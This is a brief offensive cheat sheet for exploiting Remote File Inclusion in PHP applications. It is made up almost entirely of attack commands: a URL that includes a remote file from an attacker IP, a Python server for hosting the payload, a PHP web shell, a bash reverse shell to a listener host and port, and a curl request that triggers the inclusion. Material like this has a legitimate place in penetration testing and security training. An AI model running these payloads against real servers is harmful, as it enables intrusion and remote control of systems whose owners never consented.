# RFI

### 1) Example vulnerable app

Prerequisites: This assumes the server's allow_url_fopen or allow_url_include settings are enabled.

    http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php

### 2) Reverse shell

Start a server

    python3 -m http.server 80

Host the malicious PHP shell

    # Option 1: Reverse Shell via PHP
    <?php system($_GET['cmd']); ?>
    
    # Option 2: Reverse Shell via Bash
    bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"

Perform Remote File Inclusion

    curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
